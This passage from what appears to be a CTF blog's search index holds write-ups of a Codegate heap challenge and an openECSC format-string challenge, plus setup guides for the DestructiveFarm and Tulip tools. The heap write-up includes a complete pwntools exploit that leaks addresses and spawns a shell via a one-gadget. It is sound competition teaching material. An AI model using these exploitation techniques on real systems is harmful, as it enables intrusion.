thing is getting the libc version, it can easily be copied from the docker image.\n$ docker pull ubuntu:22.04@sha256:a6d2b38300ce017add71440577d5b0a90460d0e57fd7aec21dd0d1b0761bbfb2 $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu \u0026lt;none\u0026gt; 52882761a72a 5 weeks ago 77.9MB $ docker cp \u0026#34;$(docker create 52882761a72a):/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; \u0026#34;./\u0026#34; Successfully copied 6.47MB to ./ Then I patched the binary with:\n$ pwninit --bin=chall --libc=./libc.so.6 I also used checksec to find out that all the protections on the binary are enabled. :(\nLeaking stuff Knowing that we can mess with the metadata of a chunk just by modifying the chunk above, I overrode the size field of a chunk making it bigger, overlapping the chunks after it, this way I was able to leak heap and libc. The path I took was this:\nallocate three 0x20 chunks to be overflown later allocate six chunks of the maximum size allowed (0xd0), they will be overlapped by a big chunk of size 0x4f0 (which goes into unsortedbins when freed). free one of the 0xd0 chunks (the fd of this chunk will be used to leak the heap) overflow a 0x20 chunk to change the size of the chunk after it to make it bigger, overlapping all the chunks after. We also override the data_size of struct to be able to read after data_chunk. now, reading from this chunk would let us leak the fd of the freed chunk, from that we can calculate the heap address, bypassing safe linking with fd \u0026lt;\u0026lt; 12 . as the big chunk we created is of size 0x4f0 it will go into unsortedbins when freed and its fd will point to libc main arena. tampering the data_size of the chunk before the big chunk we can read the fd of the big chunk, leaking libc. As my final goal is to ROP on the stack we will also need to leak the stack, to do that we can exploit the UAF primitive to allocate a chunk over environ and read from it.\nUAF to spawn a shell Now that we leaked all we needed we can hopefully write a ROP chain on the stack and spawn a sheel. To do that I abused the UAF to allocate a chunk over the old_rbp on the stack, overriding it with a pointer to a well chosen location on the heap so as to have the perfect constraints for a onegadget. Finally I placed the onegadget over the retaddr on the stack and used option 5 (EXIT) to make the program return to the onegadget.\nNOTE: The choice of using a onegadget is due to the fact that we can only exploit the UAF on 0x20 chunks, so we have restricted space to write our ROP chain.\nProblems I faced Obviously the exploit didn\u0026rsquo;t work first try, the main problems I faced are the following:\ninitially I couldn\u0026rsquo;t free the big chunk because I allocated it over the top chunk and this caused a corruption to the top chunk\u0026rsquo;s metadata, making the binary crash. I spent a hell of a lot of time understanding why the free function was inserting into tcachebins two chunks at a time, that is obviously caused by the fact that an \u0026ldquo;allocated chunk\u0026rdquo; is composed of two chunks: struct and data_chunk. heap chunks must be aligned by 16 bytes (last 4 bits of the address must be set to 0), so we cannot allocate directly over the retaddr because it is not aligned. safe linking is enabled in the libc version used by the binary, so we need to calculate the correct pointer to put in fd, I used the following function: def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) Final Exploit #!/usr/bin/env python3 from pwn import * exe = ELF(\u0026#34;chall_patched\u0026#34;) libc = ELF(\u0026#34;libc.so.6\u0026#34;) ld = ELF(\u0026#34;./ld-2.35.so\u0026#34;) context.binary = exe context.terminal = [\u0026#34;alacritty\u0026#34;, \u0026#34;-e\u0026#34;] def conn(): if args.LOCAL: r = process([exe.path]) elif args.GDB: r = gdb.debug([exe.path]) else: r = remote(\u0026#34;13.125.233.58\u0026#34;, 7331) return r r = conn() def get_heap_base(Pprime): Pprime_byte = 0 xor_byte = 0 decoded = Pprime \u0026gt;\u0026gt; 36 for i in range(3): Pprime_byte = Pprime \u0026gt;\u0026gt; (28 - i*8) xor_byte = Pprime_byte ^ (decoded \u0026gt;\u0026gt; 4) decoded = decoded \u0026lt;\u0026lt; 8 decoded |= xor_byte return decoded \u0026lt;\u0026lt; 12 def calculate_P1(P, L): L12 = L \u0026gt;\u0026gt; 12 P = P.to_bytes(8, \u0026#34;big\u0026#34;) L12 = L12.to_bytes(8, \u0026#34;big\u0026#34;) return int(bytes([p^l12 for p,l12 in zip(P,L12)]).hex(), 16) def add(size, data): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(size).encode()) r.sendafter(b\u0026#34;:\u0026#34;, data) def free(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) def modify(idx, data): assert len(data) \u0026lt;= 40 r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;3\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) r.sendafter(b\u0026#34;:\u0026#34;, data) def view(idx): r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;4\u0026#34;) r.sendlineafter(b\u0026#34;:\u0026#34;, str(idx).encode()) return r.recvuntil(b\u0026#34;1. add\u0026#34;)[1:-6] def main(): add(16, b\u0026#34;a\u0026#34;*16) add(16, b\u0026#34;b\u0026#34;*16) add(16, b\u0026#34;c\u0026#34;*16) for _ in range(6): add(199, b\u0026#34;x\u0026#34;*199) free(3) # chunk for heap leak # leak libc and heap abusing chunk overlapping and unsortedbins payload = b\u0026#34;c\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x4f1) + p64(40) modify(1, payload) heap = u64(view(2)[-8:]) \u0026lt;\u0026lt; 12 log.warning(f\u0026#34;heap: {hex(heap)}\u0026#34;) free(2) # free big chunk into unsortedbins payload = b\u0026#34;b\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x21) + p64(40) modify(0, payload) libc.address = u64(view(1)[-8:]) - (libc.sym[\u0026#34;main_arena\u0026#34;] + 96) log.warning(f\u0026#34;libc: {hex(libc.address)}\u0026#34;) payload = b\u0026#34;c\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x21) + p64(16) modify(0, payload) # leak stack (environ) payload = b\u0026#34;b\u0026#34;*16 + b\u0026#34;\\x00\u0026#34;*8 + p64(0x81) + p64(32) modify(4, payload) free(4) payload = p64(0x10) + p64(1) + p64(libc.sym[\u0026#34;environ\u0026#34;]) add(120, payload) retaddr = u64(view(2)[:8]) - 0x120 log.warning(f\u0026#34;stack: {hex(retaddr)}\u0026#34;) free(9) # ROP on the stack payload = ( b\u0026#34;y\u0026#34;*16 + p64(0) + p64(0x61) + p64(calculate_P1(retaddr-8, heap+0x378)) + p64(heap+0x388) + # goes in rbp (tweak for onegadet) p64(heap+0x390) + p64(0)*2 ) add(120, payload) ONE_GADGET = libc.address + 0xebd3f rbp = p64(heap+0x380) retaddr = p64(ONE_GADGET) add(16, rbp + retaddr) r.sendlineafter(b\u0026#34;\u0026gt;\u0026gt;\u0026#34;, b\u0026#34;5\u0026#34;) # exit to trigger onegadget r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() FLAG: codegate2024{f0de50c65021e07779d3cde7576c4fbe519e6412ad7de1ee743abd08b5b435844184c2295ff705f54b55790a454c427b8faf1d65bbf1f4e19df0c5613d36b0}\n","permalink":"http://leo1.cc/posts/writeups/codegatejunior24-baby_heap/","summary":"Heap challenge from the Codegate quals for juniors of 2024. The vulnerability was an heap overflow that enabled an attacker to gain overlapping chunks, therefore arb read and write.","title":"CodegateJunior24 - Baby Heap"},{"content":"Challenge Description Logging data from your application is very important. This is why we are logging ABSOLUTELY EVERYTHING in this small calculator app.\nnc log4x86.challs.open.ecsc2024.it 38019\nOverview Log4x86 is an x86 64 bit binary which consists in a simple calculator app wrapped with basic logging functionalities, such as:\nchanging log level changing log format resetting log format Reading the decompiled code we can easily notice the intense use of printf and snprinf, which might be vulnerable to format string attacks.\nReverse Engineering Decompiling the binary with Ida we can get a pretty neat main function. It\u0026rsquo;s basically a while loop which gets our input with a well implemented fgets, then it parses it with the following instruction:\n__isoc99_sscanf(command, \u0026#34;%63s %31s %31s %31s\u0026#34;, cmd, arg1, arg2, arg3); Then we have a series of if statements that call different functions according to the command we inputted. Each command is logged to stdout with the following code:\nif (GLOBAL_LOG_LEVEL \u0026lt;= 1 ) { if ( OLD_LOG != 999 ) { logLevel = logLevelResolver(1u, \u0026#34;reset_log_format\u0026#34;); sprintf( log_msg_base, LOG_FORMAT, logLevel, \u0026#34;logloglog.c\u0026#34;, 999LL, \u0026#34;Reset log format to: \u0026#39;%s\u0026#39;\u0026#34; ); OLD_LOG = 999; } printf(log_msg_base, LOG_FORMAT); } This basically writes a log message with the format string specified by LOG_FORMAT but, as I specified earlier, changing LOG_FORMAT is a functionality provided by the program itself so we could ideally inject a format-string exploit into it and then trigger it with the next snprintf. Fortunately or unfortunately (choice to you), this is not that easy, there are some checks and constraints to bypass:\nThe new LOG_FORMAT can be max 10 char long (including the NULL byte) LOG_FORMAT cannot contain $ and * There is also a regex check, but we don\u0026rsquo;t really care about it Another great thing to notice is that log_msg_base is changed only the first time a specific log is triggered. In short, if we trigger the same command multiple times in a row, only the first time log_msg_base will change. Keep this in mind, it will come in useful.\nExploitation First steps First thing I like to do before pwning is running pwninit to patch the binary with the correct version of libc and create a Pwntools template script.\nTo get the correct libc version used by the remote we can pull the docker image specified in docker-compose.yml and then extract libc.so.6 from it.\n$ docker pull cybersecnatlab/challenge-jail@sha256:7bf77225063b039960f654307cf5d6f977f892ff548606357a2e8fe8067d0a88 REPOSITORY TAG IMAGE ID CREATED SIZE cybersecnatlab/challenge-jail \u0026lt;none\u0026gt; 02becdec589e 8 months ago 139MB $ docker cp \u0026#34;$(docker create 02becdec589e):/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34; \u0026#34;./\u0026#34; Successfully copied 2.22MB to ./ Then run pwninit with\n$ pwninit --bin=logloglog --libc=./libc.so.6 Another good practice is to run checksec on the binary\n$ checksec --file=logloglog_patched RELRO STACK CANARY NX PIE Partial RELRO Canary found NX enabled PIE enabled Mhhh, Partial RELRO\u0026hellip; GOT override might be possible.\nInitial ideas After finding the format string I tried some basic payloads like %pand leaked ASLR base address, but I couldn\u0026rsquo;t do anything more seeing that I had only 9 chars to write my payload.\nMessing around with the payload I figured out that we could trigger a sort of \u0026ldquo;second-order\u0026rdquo; format string attack by setting the log format to something like %%p. This transforms into a %p after the sprintf and then is used by printf, with this technique I leaked the stack.\n$ ./logloglog_patched \u0026gt; change_log_format %%p [DBG-logloglog.c:103] Successfully read some bytes 0x597c3dd200f0 \u0026gt; aaaaaaa 0x7ffeaa48a0e0 Spoiler: this won\u0026rsquo;t be really useful :(\nAs we cannot use $ we can only interact with the first 3 parameters of printf, which are contained respectively in rsi, rdx and rcx. I inspected these register before every call to printf and sadly found out that there are no useful pointers to tamper in there.\nBypassing the whitelist After another few ours of trying random stuff and thinking hard I noticed that the log_msg_base global variable (which is the string where sprintf writes) is right on top of the command global variable (which contains our input taken by fgets), so changing the log format to %256c would cause log_msg_base to overflow into command, the next command will then override the terminator NULL byte of log_msg_base, causing it to be longer than 9 chars and bypass the whitelist.\nMemory after %256c:\n0x555555558120 \u0026lt;log_msg_base\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558130 \u0026lt;log_msg_base+16\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558140 \u0026lt;log_msg_base+32\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558150 \u0026lt;log_msg_base+48\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558160 \u0026lt;log_msg_base+64\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558170 \u0026lt;log_msg_base+80\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558180 \u0026lt;log_msg_base+96\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558190 \u0026lt;log_msg_base+112\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581a0 \u0026lt;log_msg_base+128\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581b0 \u0026lt;log_msg_base+144\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581c0 \u0026lt;log_msg_base+160\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581d0 \u0026lt;log_msg_base+176\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581e0 \u0026lt;log_msg_base+192\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x5555555581f0 \u0026lt;log_msg_base+208\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558200 \u0026lt;log_msg_base+224\u0026gt;:\t0x2020202020202020\t0x2020202020202020 0x555555558210 \u0026lt;log_msg_base+240\u0026gt;:\t0x2020202020202020\t0x1c20202020202020 0x555555558220 \u0026lt;command\u0026gt;:\t0x6c5f65676e61000a\t0x616d726f665f676f From here it\u0026rsquo;s all straight forward, we can write a format string as a command, thus overriding the NULL byte of log_msg_base (effectively enlarging log_msg_base itself). When printf(log_msg_base) is called it will trigger our format string which, at this point, has only one constraint: it can contain only one pointer (because the string ends with a NULL byte).\nArbitrary write and ret2libc Now we can leak libc and think about how to achieve ACE. My first idea was to override something on the GOT with a onegadget, but I didn\u0026rsquo;t manage to find a GOT entry that satisfied the constraints of any onegadget. This was not a great moment, because I realized that I had to create a ROP chain on the stack with format strings. After a good half-an-hour of pain I managed to ret2libc and flagged!\nSummary Overflow log_msg_base into command with %256c Override log_msg_base\u0026rsquo;s NULL byte with the next command, enlarging log_msg_base (our format string). Next commands will be appended to log_msg_base. Leak libc with %37$p Take a deep breath Write a ret2libc payload on the stack with the format string (one pointer per command due to NULL bytes) Final Thoughts This was a really painful fun challenge where I learned more about printf and buffer overflows through format string attacks.\n","permalink":"http://leo1.cc/posts/writeups/openecscr3-log4x86/","summary":"This challenge comes from the 3rd round of openECSC 2024. The challenge was really really interesting: the exploitation tecnique involved a buffer overflow through a really short format string vulnerability.","title":"OpenECSC Round 3 - Log4x86"},{"content":"Setup the submitter (server) The submitter is the tool that collects flags from farm clients, sends them to the checksystem, monitors the usage of quotas and shows the stats about the accepted and rejected flags. It is being configured and run by the team\u0026rsquo;s admin at the start of the competition. After that, team members can use a web interface to watch the exploits\u0026rsquo; results and stats.\nClone the repo on a local server or on a dedicated VPS and enter the server direcrory\n$ git clone https://github.com/DestructiveVoice/DestructiveFarm $ cd DestructiveFarm/server/ Submitter general configuration Edit config.py according to the rules of your specific competition\nTEAMS ip addresses of all the teams (generated using a format string) FLAG_FORMAT the regex the server will use to identify the flags in the traffic generated by the exploits SUBMIT_FLAG_LIMIT max number of flag the server will try to send in a SUBMIT_PERIOD FLAG_LIFETIME flags older than this period, not yet sent, will be discarded SERVER_PASSWORD password to access the front-end control page of the submitter . SYSTEM_PROTOCOL the name of your protocol (see Protocols) SYSTEM_HOST IP address of the flag checker (only for TCP protocols) SYSTEM_URL URL of the flag checker (only for HTTP protocols) SYSTEM_PORT port number used by the flag checker for incoming traffic SYSTEM_TOKEN authentication token (only for HTTP protocols) Protocols A protocol defines the interaction standard between the submitter and the flag checker hosted by the competition host. It is specific to the competition and it is usually explicitly outlined in the rules.\nThe comunication protocols usually are either based on a HTTP session or a simple TCP connection. The folder protocols/ already contains 4 examples of both cases pulled from real competitions. You need to make one specific for your competition.\nRegardless of the type of the connection, first you need to map all the possible server response to a FlagStatus.\nRESPONSES = { FlagStatus.QUEUED: [\u0026#39;timeout\u0026#39;, \u0026#39;game not started\u0026#39;, \u0026#39;try again later\u0026#39;,\u0026#39;game over\u0026#39;, \u0026#39;is not up\u0026#39;, \u0026#39;no such flag\u0026#39;], FlagStatus.ACCEPTED: [\u0026#39;accepted\u0026#39;, \u0026#39;congrat\u0026#39;], FlagStatus.REJECTED: [\u0026#39;bad\u0026#39;, \u0026#39;wrong\u0026#39;, \u0026#39;expired\u0026#39;, \u0026#39;unknown\u0026#39;, \u0026#39;your own\u0026#39;, \u0026#39;too old\u0026#39;, \u0026#39;not in database\u0026#39;, \u0026#39;already submitted\u0026#39;,\u0026#39;invalid flag\u0026#39;], } After that, the submit_flags(flags, config) function must be configured to craft a request to the checker for each flag present in the flags parameter, listen for a response by the server and update the staus of each flag based on the RESPONSES defined before.\nDestructive Farm will invoke your function whenever its needed.\nHINT: Most protocols are very similar, copy one of the examples and adapt it to your competition\nRunning the submitter Once everything is set up you can run the server by running:\n$ ./start_server.sh This script can be edited to change the port used by the service by addding --port=1234. By default Flask will use port 5000\nDestructiveFarm maintains persistence in the file flags.sqlite. Deleting the file will result in the removal of all flags collected up to this point.\nSetup the farm client A farm client is a tool that periodically runs the exploit to attack other teams and looks after their work. It can be run by each participant on their laptop after they\u0026rsquo;ve written an exploit.\nClone the same repo on the client that will run the exploit and enter the client folder\n$ git clone https://github.com/DestructiveVoice/DestructiveFarm $ cd DestructiveFarm/client/ The exploit The exploit is a script that steals flags from some service of other teams. It is written by a participant during the competition and should accept the victim\u0026rsquo;s host (IP address or domain) as the first command-line argument, attack them and print flags to stdout.\nThe first argument can be retrieved with sys.argv[1]\nYou should find an example called spl_example.py from where you can start to build your own.\nThe client The client will be in constant comunication with the server and it will periodically run the exploit providing the address of the victim. The frequency and number of invocations depends on the server configuration shown here.\nThe only 2 parameters required by the client are the name of the expoit and the address of the submitter server (the same address and port you use to reach the front-end)\n./start_sploit.py my_exploit.py -u serverAddress.com:5000 The system will automatically extract the flags from your exploit\u0026rsquo;s output based on the FLAG_FORMAT you provided here and send them to the server.\nThe server will automatically detect duplicates and it will try to submit the flags in multiple occasions until either the state of the flag becomes ACCEPTED or the lifetime of the flag is exceeded.\n","permalink":"http://leo1.cc/posts/docs/destructivefarm_setup/","summary":"DestructiveFarm is a popular tool used in CTFs and what it does is running exploits every tick to retrieve flags and automatically submit them to the checker.","title":"DestructiveFarm setup for A/D CTFs"},{"content":"Setup tulip on the VM Tulip specific configurations Clone the repo\n$ git clone https://github.com/OpenAttackDefenseTools/tulip.git $ cd tulip Edit services/api/configurations.py with the correct tick_length, start_date, vm_ip, and the services\n$ cp .env.example .env edit .env with the correct FLAG_REGEX, TICK_START, TICK_LENGTH and change TRAFFIC_DIR_HOST to point to the correct folder containing the pcaps (in our case /ready_pcaps)\nIf you want tulip to listen on a different port (e.g. port 4444) edit docker-compose.yml and under the frontend service change\nports: - \u0026#34;3000:3000\u0026#34; to\nports: - \u0026#34;4444:3000\u0026#34; WARNING: (if you host tulip on the vulnbox and don\u0026rsquo;t change the web interface port you risk other teams to steal flags throght tulip. Yep, they know tulip default port is 3000)\n$ docker compose up -d --build Tulip is now running.\nPacket capturing Save these scripts:\n/create-pcap.sh\n#!/bin/sh # -i game : game is the wireguard network interface, change it as needed mkdir -p /pcaps mkdir -p /ready_pcaps chmod 777 /pcaps chmod 777 /ready_pcaps tcpdump -G 120 -w /pcaps/myfile-%Y-%m-%d_%H.%M.%S.pcap -i game -z \u0026#39;/post-rotate.sh\u0026#39; port not 22 /post-rotate.sh\n#!/bin/sh mkdir -p /ready_pcaps/ mv $1 /ready_pcaps/ Then disable the apparmor profile for tcpdump\n$ apt install apparmor-utils $ aa-complain /usr/bin/tcpdump Now in a tmux or screen:\n$ chmod +x /create-pcap.sh $ chmod +x /post-rotate.sh $ /create-pcap.sh While create-pcap.sh is running, ready_pcaps will be populated with the network pcaps and Tulip will show them on the web interface.s\nSetup Tulip on a dedicated VPS On the vps Clone the repo\n$ git clone https://github.com/OpenAttackDefenseTools/tulip.git $ cd tulip Edit services/api/configurations.py with the correct tick_length, start_date, vm_ip, and the services\n$ cp .env.example .env edit .env with the correct FLAG_REGEX, TICK_START and TICK_LENGTH\nIf you want tulip to only listen on localhost:3000 instead of 0.0.0.0:3000, then edit docker-compose.yml and under the frontend service change\nports: - \u0026#34;3000:3000\u0026#34; to\nports: - \u0026#34;127.0.0.1:3000:3000\u0026#34; $ docker compose up -d --build Tulip is now running.\nOn the vulnbox Save these scripts:\n/create-pcap.sh\n#!/bin/sh # -i game : game is the wireguard network interface, change it as needed mkdir -p /pcaps mkdir -p /ready_pcaps chmod 777 /pcaps chmod 777 /ready_pcaps tcpdump -G 120 -w /pcaps/myfile-%Y-%m-%d_%H.%M.%S.pcap -i game -z \u0026#39;/post-rotate.sh\u0026#39; port not 22 /post-rotate.sh\n#!/bin/sh mkdir -p /ready_pcaps/ mv $1 /ready_pcaps/ Then disable the apparmor profile for tcpdump\n$ apt install apparmor-utils $ aa-complain /usr/bin/tcpdump Now in a tmux or screen:\n$ chmod +x /create-pcap.sh $ chmod +x /post-rotate.sh $ /create-pcap.sh While create-pcap.sh is running, ready_pcaps will be populated with the network pcaps.\nSend pcaps to tulip The last thing is to send the pcaps to tulip, there are two ways to do it :\n1: The vps has ssh access to the vulnbox, and can scp the pcaps 2: The vps is not in the vpn, so no access to the vulnbox. In this case the vulnbox will have ssh access to the vps (this could be hardened) Case 1: First create an ssh key in the vps and add it in the vulbox.\nThen, on the vps save the script take-pcap.sh:\n#!/usr/bin/bash IP_VULNBOX=10.32.55.2 while true do rsync -avz --remove-source-files root@$IP_VULNBOX:/ready_pcaps/* CHANGE_ME_TRAFFIC_DIR_HOST sleep 10 # tweak this as you like done Now open a tmux and run this script, tulip will receive the pcaps.\nCase 2: First create an ssh key in the vulnbox and add it in the vps.\nThen, on the vulnbox save the script take-pcap.sh:\n#!/usr/bin/bash IP_VPS=10.32.55.2 # remember to change this while true do rsync -avz --remove-source-files /ready_pcaps/* root@$IP_VPS:CHANGE_ME_TRAFFIC_DIR_HOST sleep 10 # tweak this as you like done Now open a tmux and run this script, tulip will receive the pcaps.\nCHANGE_ME_TRAFFIC_DIR_HOST is the absolute path to the TRAFFIC_DIR_HOST value in the .env you wrote when configuring tulip.\n","permalink":"http://leo1.cc/posts/docs/tulip_setup/","summary":"Tulip is a traffic analyzer tool made for A/D CTFs, this post walks you throught all the important steps requied to deploy Tulip painlessly (hopefully).","title":"Tulip setup for A/D CTFs"}]